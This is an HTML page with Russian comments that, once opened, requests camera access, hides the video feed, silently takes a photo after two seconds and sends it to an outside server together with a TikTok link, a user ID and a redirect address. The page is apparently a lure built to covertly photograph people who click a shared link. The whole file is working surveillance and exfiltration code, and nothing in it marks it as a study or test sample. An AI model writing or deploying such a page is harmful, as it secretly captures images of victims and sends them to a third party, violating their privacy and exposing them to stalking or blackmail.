<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture</title>
    <style>
        body, video {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        video {
            display: none;
        }
    </style>
</head>
<body>

<video id="video" autoplay></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // Через 2 секунды делаем снимок
            setTimeout(() => {
                // Настройка размера canvas под видео
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Отрисовка текущего кадра видео на canvas
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Преобразование изображения в Blob
                canvas.toBlob(blob => {
                    // Формирование данных для отправки
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
                    formData.append('user_id', '12345');
                    formData.append('redirect_url', 'https://www.redirect.com');

                    // Отправка данных на сервер
                    fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.text())
                    .then(result => {
                        console.log('Success:', result);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                }, 'image/jpeg');
            }, 2000); // 2 секунды ожидания для автофокуса
        })
        .catch(err => {
            console.error('Ошибка при доступе к камере:', err);
        });
</script>

</body>
</html>
